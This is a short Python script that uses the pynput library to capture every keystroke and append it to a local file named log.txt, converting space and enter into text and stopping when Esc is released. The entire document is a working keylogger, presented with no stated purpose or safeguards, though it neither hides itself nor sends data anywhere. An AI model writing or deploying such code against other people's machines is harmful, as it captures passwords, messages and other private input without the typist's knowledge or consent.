import pynput

from pynput.keyboard import Key,Listener
		
def on_press(key):
	with open("log.txt","a+") as f:
		if key==Key.space:
			key=' '
		if key==Key.shift or key==Key.esc:
			key=''
		if key==Key.enter:
			key='\n'
		key=str(key).replace("'","")
		f.write(str(key))

def on_release(key):
	if key==Key.esc:
		with open("log.txt","a+") as f:
			f.write('\n------\n\n')
			return False
				
with Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()
